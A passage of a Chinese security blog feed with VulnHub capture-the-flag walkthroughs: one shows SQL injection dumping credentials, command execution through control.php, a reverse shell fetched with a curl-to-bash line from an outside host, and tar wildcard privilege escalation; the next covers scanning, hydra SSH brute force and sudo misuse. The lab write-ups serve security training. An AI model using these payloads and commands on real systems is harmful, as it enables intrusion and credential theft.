&lt;h4 id=&#34;判断是否是注入点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#判断是否是注入点&#34;&gt;#&lt;/a&gt; 判断是否是注入点&lt;/h4&gt;
&lt;p&gt;对 history.php 所在的 url 地址尝试手工判断是否是注入点&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjBhbmQlMjAxPTEtLSs=&#34;&gt; http://192.168.31.208/history.php?user=admin&#39; and 1=1--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;and 1=1 --+ 被执行，and 1=2 --+ 报错，是注入点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-539.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h4 id=&#34;猜字段数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜字段数&#34;&gt;#&lt;/a&gt; 猜字段数&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMDEtLSs=&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select 1--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;猜字段有多少个，1 时是正确的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-540.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMDEsMi0tKw==&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select 1,2--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1,2 时报错了，说明只能爆出来一个字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-541.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;h4 id=&#34;猜当前数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜当前数据库&#34;&gt;#&lt;/a&gt; 猜当前数据库&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4=&#34;&gt;http://192.168.31.208/history.php?user=admin&lt;/span&gt;’ union select database()–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-542.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;数据库名是 users&lt;/p&gt;
&lt;h4 id=&#34;猜数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜数据库&#34;&gt;#&lt;/a&gt; 猜数据库&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChzY2hlbWFfbmFtZSklMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhLS0r&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_concat(schema_name) from information_schema.schemata--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;group_concat(schema_name) from information_schema.schemata–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-543.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一共有四个数据库 information_schema,mysql,performance_schema,sys,users&lt;/p&gt;
&lt;h4 id=&#34;猜表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜表&#34;&gt;#&lt;/a&gt; 猜表&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSUyMGZyb20lMjBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzJTIwd2hlcmUlMjB0YWJsZV9zY2hlbQ==&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_concat(table_name) from information_schema.tables where table_schem&lt;/span&gt;&lt;br&gt;
a=%27users%27–+&lt;/p&gt;
&lt;p&gt;group_concat(table_name) from information_schema.tables where&lt;br&gt;
table_schema=‘users’–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-544.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;数据库 user 下有两个表：details,log&lt;/p&gt;
&lt;h4 id=&#34;猜列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜列&#34;&gt;#&lt;/a&gt; 猜列&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSklMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMlMjB3aGVyZSUyMHRhYmxlX25hbWU9JTI3ZGV0YWlscyUyNy0tKw==&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_concat(column_name) from information_schema.columns where table_name=&#39;details&#39;--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;group_concat(column_name) from information_schema.columns where&lt;br&gt;
table_name=‘details’–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-545.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;users.detail 表中有两列：name，password&lt;/p&gt;
&lt;h4 id=&#34;猜字段&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜字段&#34;&gt;#&lt;/a&gt; 猜字段&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2Nv&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_co&lt;/span&gt;&lt;br&gt;
ncat(name)%20from%20users.details–+&lt;/p&gt;
&lt;p&gt;group_concat(name) from users.details–+admin,admin123,john,test&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-546.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;users.detail 中 name 分别是：admin,admin123,john,test&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChwYXNzd29yZCklMjBmcm9tJTIwdXNlcnMuZGV0YWlscy0tKw==&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_concat(password) from users.details--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;group_concat(password) from users.details–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-547.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;users.detail 中 password 分别是：&lt;br&gt;
myadmin#p4szw0r4d,admin123,Sup3r&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S3cr3t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;PasSW0RD,test&lt;/p&gt;
&lt;p&gt;去除掉自己注册掉的用户之外，发现源网站存在两个用户和密码&lt;/p&gt;
&lt;p&gt;-&amp;gt; Admin: myadmin#p4szw0r4d john: Sup3r&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S3cr3t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;PasSW0RD&lt;/p&gt;
&lt;h3 id=&#34;php-代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-代码审计&#34;&gt;#&lt;/a&gt; php 代码审计&lt;/h3&gt;
&lt;p&gt;由 Admin: myadmin#pszw0r4d 登陆到网站后台&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-548.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;home.php 页面检测到了 admin 账户已经登陆成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-549.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dpdGh1Yi5jb20vY3liZXJib3Q3NS9rZXlyaW5n&#34;&gt;http://github.com/cyberbot75/keyring&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;查看源码，审计源码，发现 control.php 存在 RCE 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-550.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注入参数为 cmdcntr 测试是否回显成功&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9aWQ=&#34;&gt;http://192.168.31.208/control.php?cmdcntr=id&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-551.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有回显，RCE 确实存在，测试是否存在相应的可反弹 shell 的命令&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9d2hpY2glMjBjdXJsO3doaWNoJTIwYmFzaDt3aGljaCUyMHB5dGhvbjt3aGljaCUyMHBocDs=&#34;&gt;http://192.168.31.208/control.php?cmdcntr=which curl;which bash;which python;which php;&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-552.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;后台反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台反弹shell&#34;&gt;#&lt;/a&gt; 后台反弹 shell&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9Y3VybCUyMGh0dHA6Ly93d3cuY2hlbnR1by5hc2lhL3NoZWxsLnNoJTdDYmFzaA==&#34;&gt;http://192.168.31.208/control.php?cmdcntr=curl http://www.chentuo.asia/shell.sh|bash&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-553.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接收 shell，并将其转变为一个标准的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-554.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;检查各个文件，查看有没有敏感的目录&lt;/p&gt;
&lt;p&gt;发现有一个 john 的用户，之前通过 sql 注入网站爆出的用户名有 john&lt;br&gt;
john: Sup3r&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S3cr3t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;PasSW0RD 切换到了 john 用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-555.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;strings-查看文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#strings-查看文件&#34;&gt;#&lt;/a&gt; strings 查看文件&lt;/h3&gt;
&lt;p&gt;翻阅相关的文件，找到了一个敏感的文件 s 权限的 compress&lt;br&gt;
 但是服务器不存在 strings 不能查看这个命令里封装的是什么&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-556.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 scp/wget 将文件下载到了 kali 主机上&lt;br&gt;
 strings compress 查看此命令的详细信息，compose 会调用 root 的 s 权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-557.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;tar-通配符提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tar-通配符提权&#34;&gt;#&lt;/a&gt; tar 通配符提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;tar通配符提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;/bin/bash&amp;quot; &amp;gt; exp.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint-action=exec=sh exp.sh&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;quot; &amp;gt; --checkpoint=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./compress&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-558.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;lxd-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lxd-提权&#34;&gt;#&lt;/a&gt; lxd 提权&lt;/h3&gt;
&lt;p&gt;在 john 用户下，查看 id 时看到了所有组中有 lxd，并且本地有 lxc 命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-559.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;searchsploit lxd 查找到了本地是存在此 exp 的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-560.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;阅读利用脚本说明，需要在攻击机上下载并以 root 账户编译该文件，最后将编译成功的文件以及 exp 一块发送到目标机器上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-561.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在攻击机上下载 payload&lt;br&gt;
 &lt;code&gt;wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-562.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在攻击机上编译此 payload&lt;br&gt;
 运行此命令时因为 kali 机器是在 M1 的 mac 电脑上搭建的，属于 aarch，不同于 windows 的 amd64 系统，因此编译失败了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-563.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; Lxd 提权失败了，需要一台 amd64 的机器进行编译此文件&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/128%20BLUEMOON/</id>
        <title>VULNHUB 28 BLUEMOON</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/128%20BLUEMOON/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZW1vb24tMjAyMSw2Nzkv&#34;&gt;https://www.vulnhub.com/entry/bluemoon-2021,679/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZDViN2YyZDIwZTQ=&#34;&gt;https://www.jianshu.com/p/5d5b7f2d20e4&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 BLUEMOON：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-702.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.153&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-703.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
&lt;h3 id=&#34;ftp-弱口令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-弱口令&#34;&gt;#&lt;/a&gt; FTP 弱口令&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-704.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看源代码，发现一个图片的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-705.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看样子是一个蓝色的月球，但是这个图片没什么作用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-706.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;先尝试从 ftp 进行突破 &lt;code&gt;ftp 192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-707.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试弱口令登陆失败，接下来对 80 网站进行目录扫描&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;可以使用各种工具扫描，扫描结果可能因为字典的不同而得到不同的结果，这里我用 dirmap 和 gobuster 两者都扫描了一次&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python3 dirmap.py -i http://192.168.0.153 -lcf&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-708.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;dirmap 默认的字典并不是很全，如果需要有更准确的信息，需要换字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-709.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 dirbuster 中的 directory 字典扫出来了一个目录：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvaGlkZGVuX3RleHQ=&#34;&gt;http://192.168.0.153/hidden_text&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-710.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看源代码，看能否有更多的发现，找到了一个隐藏的图片&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-711.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问得到了一个 url 地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvLlFSX0MwZDMucG5n&#34;&gt;http://192.168.0.153/.QR_C0d3.png&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-712.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;linux-识别二维码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-识别二维码&#34;&gt;#&lt;/a&gt; linux 识别二维码&lt;/h3&gt;
&lt;p&gt;用 linux 来识别这个二维码，看能否从这个二维码中得到更多可靠的信息&lt;/p&gt;
&lt;p&gt;下载到 kali 机器上，并修改文件名字为 qr.png:  &lt;code&gt;wget http://192.168.0.153/.QR_C0d3.png -O qr.png&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-713.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Linux 下可以用 zbarimg 来识别二维码&lt;br&gt;
 &lt;code&gt;zbarimg x.png&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-714.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 找到了 ftp 的账户和密码 ftp:ftpp@ssword&lt;/p&gt;
&lt;h3 id=&#34;ftp-信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-信息收集&#34;&gt;#&lt;/a&gt; FTP 信息收集&lt;/h3&gt;
&lt;p&gt;登陆到 ftp 服务器查看存在 ftp 中的有哪些文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-715.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 ftp 服务中的资料下载到本地查看内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-716.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; Infromation 中的内容如下，透露出来一个用户名 robin，并且他的密码强度弱 p_lists.txt 为一些密码，很显然需要通过 hydra 爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-717.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 robin 作为用户名，p_lists 做为密码进行爆破 ssh，得到了密码&lt;br&gt;
 &lt;code&gt;hydra -l robin -P p_lists.txt ssh://192.168.0.153 -f -t 4 -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-718.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 ssh 命令成功登陆到了靶机中&lt;br&gt;
 &lt;code&gt;ssh 192.168.0.153 -l robin&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-719.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;docker-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker-提权&#34;&gt;#&lt;/a&gt; docker 提权&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;  查看有无权限设置错误&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-720.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现可以以 jerry 的身份执行这个脚本  &lt;code&gt;sudo -u jerry /home/robin/project/feedback.sh&lt;/code&gt; &lt;br&gt;
 执行后，输入两个 bash，拿到了 jerry 的权限&lt;/p&gt;
